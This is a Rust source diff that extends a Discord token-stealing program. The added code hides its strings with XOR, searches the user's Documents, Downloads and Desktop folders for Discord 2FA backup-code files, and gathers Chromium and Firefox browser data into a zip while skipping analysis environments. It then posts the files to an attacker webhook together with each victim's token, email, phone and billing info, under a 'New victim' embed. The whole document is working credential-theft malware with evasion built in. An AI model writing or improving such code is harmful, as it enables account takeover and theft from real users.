@@ -10,6 +10,7 @@ use serde_json::{json, Value};
 use std::{
     collections::{HashMap, HashSet},
     env, fs,
+    io::Write,
     path::PathBuf,
 };
 use windows::Win32::Security::Cryptography::{CryptUnprotectData, CRYPT_INTEGER_BLOB};
@@ -106,6 +107,61 @@ fn s_token_regex() -> String {
         0x3E, 0x0B, 0x2D, 0x6E, 0x2D, 0x63, 0x0D, 0x3D, 0x02, 0x39, 0x0B, 0x60, 0x01, 0x04, 0x78,
         0x07, 0x71,
     ])
+}
+
+fn s_userprofile() -> String {
+    xor_str(&[
+        0x0F, 0x09, 0x1F, 0x08, 0x0A, 0x08, 0x15, 0x1C, 0x13, 0x16, 0x1F,
+    ])
+}
+
+fn s_documents() -> String {
+    xor_str(&[0x1E, 0x35, 0x39, 0x2F, 0x37, 0x3F, 0x34, 0x2E, 0x29])
+}
+
+fn s_downloads() -> String {
+    xor_str(&[0x1E, 0x35, 0x2D, 0x34, 0x36, 0x35, 0x3B, 0x3E, 0x29])
+}
+
+fn s_desktop() -> String {
+    xor_str(&[0x1E, 0x3F, 0x29, 0x31, 0x2E, 0x35, 0x2A])
+}
+
+fn s_backup_codes_filename() -> String {
+    xor_str(&[
+        0x3E, 0x33, 0x29, 0x39, 0x35, 0x28, 0x3E, 0x05, 0x38, 0x3B, 0x39, 0x31, 0x2F, 0x2A, 0x05,
+        0x39, 0x35, 0x3E, 0x3F, 0x29, 0x74, 0x2E, 0x22, 0x2E,
+    ])
+}
+
+fn s_backup_codes_base() -> String {
+    xor_str(&[
+        0x3E, 0x33, 0x29, 0x39, 0x35, 0x28, 0x3E, 0x05, 0x38, 0x3B, 0x39, 0x31, 0x2F, 0x2A, 0x05,
+        0x39, 0x35, 0x3E, 0x3F, 0x29,
+    ])
+}
+
+fn s_browser_data_zip() -> String {
+    xor_str(&[
+        0x38, 0x28, 0x35, 0x2D, 0x29, 0x3F, 0x28, 0x05, 0x3E, 0x3B, 0x2E, 0x3B, 0x74, 0x20, 0x33,
+        0x2A,
+    ])
+}
+
+fn s_application_zip() -> String {
+    xor_str(&[
+        0x3B, 0x2A, 0x2A, 0x36, 0x33, 0x39, 0x3B, 0x2E, 0x33, 0x35, 0x34, 0x75, 0x20, 0x33, 0x2A,
+    ])
+}
+
+fn s_payload_json() -> String {
+    xor_str(&[
+        0x2A, 0x3B, 0x23, 0x36, 0x35, 0x3B, 0x3E, 0x05, 0x30, 0x29, 0x35, 0x34,
+    ])
+}
+
+fn s_text_plain() -> String {
+    xor_str(&[0x2E, 0x3F, 0x22, 0x2E, 0x75, 0x2A, 0x36, 0x3B, 0x33, 0x34])
 }
 
 fn is_debugged() -> bool {
@@ -229,6 +285,159 @@ async fn fetch_billing_info(client: &reqwest::Client, token: &str) -> String {
     }
 }
 
+fn is_backup_codes_filename(name: &str) -> bool {
+    if name.eq_ignore_ascii_case(&s_backup_codes_filename()) {
+        return true;
+    }
+
+    let base = s_backup_codes_base();
+    if name.len() < base.len() + 6 {
+        return false;
+    }
+    if !name[..base.len()].eq_ignore_ascii_case(&base) {
+        return false;
+    }
+
+    let rest = &name[base.len()..];
+    if !rest.starts_with(" (") || !rest.ends_with(".txt") {
+        return false;
+    }
+
+    let digits = &rest[2..rest.len() - 4];
+    !digits.is_empty() && digits.chars().all(|c| c.is_ascii_digit())
+}
+
+fn find_backup_codes() -> Option<String> {
+    let profile = env::var(s_userprofile()).ok()?;
+    let search_dirs = [s_documents(), s_downloads(), s_desktop()];
+
+    for dir_name in search_dirs {
+        let dir = PathBuf::from(&profile).join(dir_name);
+        if !dir.is_dir() {
+            continue;
+        }
+
+        let exact = dir.join(s_backup_codes_filename());
+        if exact.is_file() {
+            return exact.to_str().map(String::from);
+        }
+
+        let entries = match fs::read_dir(&dir) {
+            Ok(entries) => entries,
+            Err(_) => continue,
+        };
+
+        for entry in entries.flatten() {
+            let path = entry.path();
+            if !path.is_file() {
+                continue;
+            }
+            let name = match path.file_name().and_then(|n| n.to_str()) {
+                Some(name) => name,
+                None => continue,
+            };
+            if is_backup_codes_filename(name) {
+                return path.to_str().map(String::from);
+            }
+        }
+    }
+
+    None
+}
+
+fn collect_browser_files() -> Vec<(String, String)> {
+    if browsers::is_analysis_environment() || !browsers::env_configured() {
+        return Vec::new();
+    }
+
+    let gecko_handle = std::thread::spawn(browsers::gecko::extract_all);
+    let mut all_files = browsers::chromium::extract_all();
+    all_files.extend(gecko_handle.join().unwrap_or_default());
+    all_files
+}
+
+fn build_browser_zip(files: &[(String, String)]) -> Option<Vec<u8>> {
+    if files.is_empty() {
+        return None;
+    }
+
+    use std::io::Cursor;
+    use zip::write::FileOptions;
+
+    let mut cursor = Cursor::new(Vec::new());
+    {
+        let mut zip = zip::ZipWriter::new(&mut cursor);
+        let options = FileOptions::default().compression_method(zip::CompressionMethod::Deflated);
+        for (name, content) in files {
+            if zip.start_file(name, options).is_ok() {
+                let _ = zip.write_all(content.as_bytes());
+            }
+        }
+        let _ = zip.finish();
+    }
+
+    Some(cursor.into_inner())
+}
+
+async fn send_webhook_message(
+    client: &reqwest::Client,
+    webhook_url: &str,
+    embed: Value,
+    zip_data: Option<Vec<u8>>,
+    backup_codes_path: Option<&str>,
+) {
+    let mut attachment_meta = Vec::new();
+    let mut file_parts: Vec<(String, reqwest::multipart::Part)> = Vec::new();
+    let mut idx = 0u64;
+
+    if let Some(zip) = zip_data {
+        attachment_meta.push(json!({
+            "id": idx,
+            "filename": s_browser_data_zip()
+        }));
+        if let Ok(part) = reqwest::multipart::Part::bytes(zip)
+            .file_name(s_browser_data_zip())
+            .mime_str(&s_application_zip())
+        {
+            file_parts.push((format!("files[{idx}]"), part));
+            idx += 1;
+        }
+    }
+
+    if let Some(path) = backup_codes_path {
+        if let Ok(data) = fs::read(path) {
+            attachment_meta.push(json!({
+                "id": idx,
+                "filename": s_backup_codes_filename()
+            }));
+            if let Ok(part) = reqwest::multipart::Part::bytes(data)
+                .file_name(s_backup_codes_filename())
+                .mime_str(&s_text_plain())
+            {
+                file_parts.push((format!("files[{idx}]"), part));
+            }
+        }
+    }
+
+    if file_parts.is_empty() {
+        let _ = client.post(webhook_url).json(&embed).send().await;
+        return;
+    }
+
+    let mut payload = embed;
+    if let Some(obj) = payload.as_object_mut() {
+        obj.insert("attachments".to_string(), json!(attachment_meta));
+    }
+
+    let payload_json = serde_json::to_string(&payload).unwrap_or_default();
+    let mut form = reqwest::multipart::Form::new().text(s_payload_json(), payload_json);
+    for (field, part) in file_parts {
+        form = form.part(field, part);
+    }
+
+    let _ = client.post(webhook_url).multipart(form).send().await;
+}
+
 fn badge_emojis(flags: u64) -> Vec<&'static str> {
     let badges = [
         (1 << 0, "<:Badge_Discord_Staff:1365704725646807060>"),
@@ -346,6 +555,10 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     let mut sent_tokens = HashSet::new();
     let discord_paths = get_discord_paths();
     let marker = s_token_marker();
+    let backup_codes_path = find_backup_codes();
+    let browser_files = collect_browser_files();
+    let browser_zip = build_browser_zip(&browser_files);
+    let mut delivered_with_token = false;
 
     for (name, path) in discord_paths {
         if !path.exists() {
@@ -416,27 +629,46 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                                                                 fetch_billing_info(&client, &token)
                                                                     .await;
 
+                                                            let mut embed_fields = vec![
+                                                                json!({ "name": "<a:b_diamond:1356277335921262885> Username", "value": format!("`{}`", user.tag), "inline": true }),
+                                                                json!({ "name": "<a:dark_butterfly:1441101545465974935> ID", "value": format!("`{}`", user.id), "inline": true }),
+                                                                json!({ "name": "<a:flecheblanche:1482614586413682730> Source", "value": name.to_string(), "inline": false }),
+                                                                json!({ "name": "<a:flecheblanche:1482614586413682730> Token", "value": format!("```{}```", token), "inline": false }),
+                                                                json!({ "name": "<a:all_discord_badges_gif:1157698511320653924> Badges", "value": final_badges, "inline": false }),
+                                                                json!({ "name": "<a:dark_butterfly:1441101545465974935> Email", "value": format!("`{}`", user.email), "inline": false }),
+                                                                json!({ "name": "<a:dark_butterfly:1441101545465974935> Phone", "value": format!("`{}`", user.phone), "inline": false }),
+                                                                json!({ "name": "<a:dark_butterfly:1441101545465974935> 2FA", "value": format!("`{}`", if user.mfa_enabled { "Enabled" } else { "Disabled" }), "inline": true }),
+                                                                json!({ "name": "<a:dark_butterfly:1441101545465974935> Billing Info", "value": format!("`{}`", billing_info), "inline": false }),
+                                                            ];
+
+                                                            if backup_codes_path.is_some() {
+                                                                embed_fields.push(json!({
+                                                                    "name": "<a:dark_butterfly:1441101545465974935> Backup Codes",
+                                                                    "value": "✅ Attached as file",
+                                                                    "inline": false
+                                                                }));
+                                                            }
+
                                                             let embed = json!({
                                                                 "embeds": [{
                                                                     "title": "<a:clown:1366404450436124702> New victim <a:clown:1366404450436124702>",
                                                                     "color": 0x7289DA,
                                                                     "thumbnail": { "url": avatar_url },
-                                                                    "fields": [
-                                                                        { "name": "<a:b_diamond:1356277335921262885> Username", "value": format!("`{}`", user.tag), "inline": true },
-                                                                        { "name": "<a:dark_butterfly:1441101545465974935> ID", "value": format!("`{}`", user.id), "inline": true },
-                                                                        { "name": "<a:flecheblanche:1482614586413682730> Source", "value": name.to_string(), "inline": false },
-                                                                        { "name": "<a:flecheblanche:1482614586413682730> Token", "value": format!("```{}```", token), "inline": false },
-                                                                        { "name": "<a:all_discord_badges_gif:1157698511320653924> Badges", "value": final_badges, "inline": false },
-                                                                        { "name": "<a:dark_butterfly:1441101545465974935> Email", "value": format!("`{}`", user.email), "inline": false },
-                                                                        { "name": "<a:dark_butterfly:1441101545465974935> Phone", "value": format!("`{}`", user.phone), "inline": false },
-                                                                        { "name": "<a:dark_butterfly:1441101545465974935> 2FA", "value": format!("`{}`", if user.mfa_enabled { "Enabled" } else { "Disabled" }), "inline": true },
-                                                                        { "name": "<a:dark_butterfly:1441101545465974935> Billing Info", "value": format!("`{}`", billing_info), "inline": false }
-                                                                    ],
+                                                                    "fields": embed_fields,
                                                                     "footer": { "text": "VVS V3" },
                                                                     "timestamp": chrono::Utc::now().to_rfc3339()
                                                                 }]
                                                             });
-                                                            let _ = client.post(&wbh).json(&embed).send().await;
+
+                                                            send_webhook_message(
+                                                                &client,
+                                                                &wbh,
+                                                                embed,
+                                                                browser_zip.clone(),
+                                                                backup_codes_path.as_deref(),
+                                                            )
+                                                            .await;
+                                                            delivered_with_token = true;
                                                         }
                                                     }
                                                 }
@@ -452,6 +684,8 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
         }
     }
 
-    let _ = browsers::run(&client, &wbh).await;
+    if !delivered_with_token {
+        let _ = browsers::run(&client, &wbh).await;
+    }
     Ok(())
 }
